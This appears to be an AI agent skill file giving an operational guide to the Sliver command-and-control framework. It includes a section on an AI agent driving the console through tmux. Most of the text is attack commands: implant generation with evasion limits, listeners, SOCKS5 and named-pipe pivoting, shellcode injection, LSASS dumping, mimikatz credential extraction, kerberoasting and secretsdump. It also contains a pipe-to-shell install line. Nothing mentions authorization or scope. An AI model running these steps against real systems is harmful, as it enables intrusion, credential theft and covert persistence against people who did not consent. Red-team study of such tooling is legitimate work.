---
name: sliver-c2
description: "Sliver C2 framework operation guide. Use when establishing command-and-control channels, managing implants, or performing post-exploitation. Supports mTLS/HTTPS/DNS/WireGuard multi-protocol operation, Session/Beacon dual modes, SOCKS5 proxying, and TCP/Named Pipe multi-layer pivoting. Suitable for red team operations and penetration testing scenarios."
zh-signals: "使用 Sliver C2 框架建立命令控制通道、管理植入体并执行后渗透操作。信号:Sliver,C2框架,植入体,后渗透,多层穿透"
when-to-use: >-
  Use when establishing command-and-control channels, managing implants, or performing
  post-exploitation with Sliver across mTLS/HTTPS/DNS/WireGuard.
metadata:
  tags: "sliver,c2,command-and-control,implant,beacon,session,mtls,socks5,pivoting,named-pipe,post-exploitation,bof"
  category: "evasion"
---

# Sliver C2 Framework Operation Guide

Sliver is an open-source cross-platform C2 framework supporting multi-protocol communication (mTLS/HTTPS/HTTP/DNS/WireGuard), Session/Beacon dual modes, port forwarding/SOCKS5/TCP Pivot/Named Pipe Pivot capabilities, the Armory extension ecosystem, and BOF/COFF execution.

---

## Phase 1: Environment Setup

```bash
# Install
curl https://sliver.sh/install | sudo bash
sliver-server       # start the server side
sliver-client       # client connection
```

### tmux Non-Interactive Operation (AI Agent Scenario)

```bash
tmux new-session -d -s sliver "/path/to/sliver-client console"
sleep 5
tmux send-keys -t sliver "version" Enter
sleep 2
tmux capture-pane -t sliver -p | tail -20           # capture the output
tmux send-keys -t sliver "generate --mtls 10.0.0.164:8888 --os linux --save /tmp/implant" Enter
sleep 120                                             # wait for the compilation
tmux capture-pane -t sliver -p                        # view the result
tmux kill-session -t sliver                           # close
```

### Basic Commands

```bash
sliver > version          # version
sliver > jobs             # running listeners
sliver > implants         # generated implants
sliver > sessions         # active sessions
sliver > beacons          # active beacons
```

---

## Phase 2: Listener Configuration

```bash
sliver > mtls                                          # mTLS (recommended)
sliver > mtls --lhost 192.168.1.100 --lport 8888
sliver > https --domain example.com                    # HTTPS
sliver > https --domain example.com --lets-encrypt     # HTTPS + automatic certificate
sliver > https --domain example.com --website fake-blog # HTTPS + static masquerade
sliver > http                                          # HTTP
sliver > dns --domains 1.example.com.                  # DNS (FQDN with a trailing dot)
sliver > wg                                            # WireGuard
sliver > jobs                                          # view the listeners
sliver > jobs -k JOB_ID                                # stop a listener
```

### Protocol Comparison

```
+------------+----------+----------------+--------+--------+--------------------+
| Protocol   | Port     | Encryption     | Speed  | Stealth | Scenario            |
+------------+----------+----------------+--------+--------+--------------------+
| mTLS       | 8888     | Mutual TLS     | Fast   | Medium  | Internal network    |
| HTTPS      | 443      | TLS            | Medium | High    | Restricted egress   |
| HTTP       | 80       | App-layer      | Medium | Medium  | Proxy environment   |
| DNS        | 53       | App-layer      | Slow   | High    | Highly restricted   |
| WireGuard  | 53/UDP   | WireGuard      | Fast   | Medium  | Port forwarding     |
+------------+----------+----------------+--------+--------+--------------------+
```

-> [references/c2-protocols.md](references/c2-protocols.md)

---

## Phase 3: Implant Generation

### Session vs Beacon

| Characteristic | Session | Beacon |
|------|---------|--------|
| Communication | Real-time persistent connection | Periodic polling (60s by default) |
| Stealth | Lower | Higher |
| shell/portfwd/pivot | Directly supported | Requires switching with `interactive` |
| Use case | Interactive operations | Long-term persistence |

### Generation Commands

```bash
# Session mode
sliver > generate --mtls example.com --os windows --arch amd64 --save /tmp
# Beacon mode
sliver > generate beacon --mtls example.com --os windows --seconds 30 --jitter 10 --save /tmp
# Multi-protocol backup
sliver > generate --mtls example.com --http backup.com --dns 1.dns.com.
# Output formats: exe / shared (DLL/SO) / shellcode / service (Windows service)
sliver > generate --mtls example.com --format shellcode --save /tmp
```

### Evasion Options

```bash
sliver > generate --mtls example.com --limit-datetime "2024-12-31"    # limit the execution time
sliver > generate --mtls example.com --limit-domainjoined             # domain-joined machines only
sliver > generate --mtls example.com --limit-hostname "TARGET-PC"     # limit the hostname
sliver > generate --mtls example.com --limit-username "admin"         # limit the username
```

-> [references/implant-generation.md](references/implant-generation.md)

---

## Phase 4: Session Management

### Interaction

```bash
sliver > use SESSION_ID                 # use a session
sliver (BEACON) > interactive           # switch a Beacon to a Session
sliver (SESSION) > close                # close the session
```

### File Operations

```bash
sliver (SESSION) > ls / cd / pwd / cat             # filesystem navigation
sliver (SESSION) > download /remote/file /local     # download
sliver (SESSION) > upload /local/file /remote       # upload
sliver (SESSION) > mkdir /path && rm /path          # create/delete
```

### Process Management

```bash
sliver (SESSION) > ps                               # list processes
sliver (SESSION) > ps -e "lsass"                    # filter by name
sliver (SESSION) > kill PID                          # terminate a process
sliver (SESSION) > procdump -p PID -s /tmp/proc.dmp # process dump
```

### Command Execution

```bash
sliver (SESSION) > shell                             # interactive shell (Session only)
sliver (SESSION) > execute -o whoami                 # execute and return the output
sliver (SESSION) > execute -o "cmd /c dir"
sliver (SESSION) > msf -m payload/windows/x64/exec   # Metasploit integration
```

---

## Phase 5: Network Pivoting

### Port Forwarding

```bash
sliver (SESSION) > portfwd add --remote 10.10.10.10:3389               # local forwarding
sliver (SESSION) > portfwd add --bind 0.0.0.0:1234 --remote 10.10.10.10:22
sliver (SESSION) > rportfwd add --remote 0.0.0.0:8080 --local 127.0.0.1:80  # reverse forwarding
sliver (SESSION) > wg-portfwd add --remote 10.10.10.10:3389            # WireGuard forwarding
sliver (SESSION) > portfwd rm ID                                        # delete
```

### SOCKS5 Proxy + proxychains4

```bash
sliver (SESSION) > socks5 start --port 1080
sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
proxychains4 -q nmap -sT -Pn -p 445,389,88 192.168.56.0/24
proxychains4 -q netexec smb 192.168.56.0/24
proxychains4 -q secretsdump.py domain/user:pass@192.168.56.10
```

### TCP Pivot (Multi-Layer Internal Network)

```bash
sliver (EDGE_SESSION) > pivots tcp --bind 0.0.0.0:9898       # start the pivot on the edge machine
sliver > generate --tcp-pivot 10.10.10.5:9898 --save /tmp    # generate the pivot implant
sliver (EDGE_SESSION) > upload /tmp/IMPLANT C:\Windows\Temp\  # upload and execute
sliver (EDGE_SESSION) > execute C:\Windows\Temp\IMPLANT
```

### Named Pipe Pivot (Covert on the Same Segment)

```bash
sliver (SESSION) > pivots named-pipe --bind mypipe --allow-all
sliver > generate --named-pipe 192.168.1.100/pipe/mypipe --save /tmp
```

-> [references/pivoting-proxy.md](references/pivoting-proxy.md)

---

## Phase 6: Post-Exploitation

### Process Injection

```bash
sliver (SESSION) > migrate PID                                    # migrate the process
sliver (SESSION) > execute-shellcode -p PID /path/to/shellcode.bin # shellcode injection
sliver (SESSION) > execute-assembly /path/to/assembly.exe arg1     # in-memory .NET loading
```

### Credential Operations

```bash
sliver > armory install nanodump
sliver (SESSION) > nanodump                                        # LSASS dump
sliver > armory install rubeus
sliver (SESSION) > rubeus triage / kerberoast / asreproast         # Kerberos operations
sliver > armory install mimikatz
sliver (SESSION) > mimikatz "sekurlsa::logonpasswords"             # credential extraction
```

### Privilege Escalation

```bash
sliver (SESSION) > getsystem                     # obtain SYSTEM
sliver (SESSION) > impersonate USERNAME           # impersonate a user
sliver (SESSION) > rev2self                       # restore the original token
```

### Armory Extensions and BOF Execution

```bash
sliver > armory                                   # list the available extensions
sliver > armory install coff-loader               # BOF loader
sliver > armory install rubeus nanodump seatbelt sharphound sharpwmi
sliver > armory install all                       # install everything
sliver > extensions                               # view the installed extensions
sliver (SESSION) > nanodump -h                    # BOF help
sliver (SESSION) > rubeus kerberoast              # invoke a BOF directly
```

-> [references/post-exploitation.md](references/post-exploitation.md)

---

## Decision Tree

```
Need to establish a C2 channel?
|
+-- Network environment assessment
|   |
|   +-- Internal/controlled environment ------> mTLS (fastest and most stable)
|   +-- Restricted egress / proxy present ----> HTTPS (proxy aware)
|   +-- DNS-only egress ----------------------> DNS (slow but covert)
|   +-- High-performance tunnel required ------> WireGuard
|   +-- Uncertain ----------------------------> Multi-protocol backup (mTLS + HTTPS + DNS)
|
+-- Choose the implant mode
|   |
|   +-- Need real-time interaction? ----------> Session (shell/portfwd/socks5)
|   +-- Need long-term persistence? -----------> Beacon (--seconds/--jitter)
|
+-- Need to access internal resources?
|   |
|   +-- Single port --------------------------> portfwd add
|   +-- Multiple ports / scanning ------------> socks5 start + proxychains4
|   +-- Target cannot reach egress ------------> TCP Pivot
|   +-- Lateral movement on the same segment (Windows) --> Named Pipe Pivot
|
+-- Post-exploitation operations
    |
    +-- Need credentials -----------------------> nanodump / rubeus / mimikatz BOF
    +-- Need persistence ----------------------> migrate to a stable process
    +-- Need to execute .NET tools -------------> execute-assembly
    +-- Need BOF extensions -------------------> armory install + direct invocation
```

---

## Tool List

| Tool | Purpose |
|------|------|
| sliver-server | C2 server side |
| sliver-client | Operator client |
| wg-quick | WireGuard client |
| tmux | Non-interactive script integration |
| proxychains4 | SOCKS proxy toolchain routing |

---

## Reference Documents

- -> [references/c2-protocols.md](references/c2-protocols.md) - Detailed C2 protocol configuration
- -> [references/implant-generation.md](references/implant-generation.md) - Detailed implant generation
- -> [references/pivoting-proxy.md](references/pivoting-proxy.md) - Network pivoting and proxying
- -> [references/post-exploitation.md](references/post-exploitation.md) - Post-exploitation operations
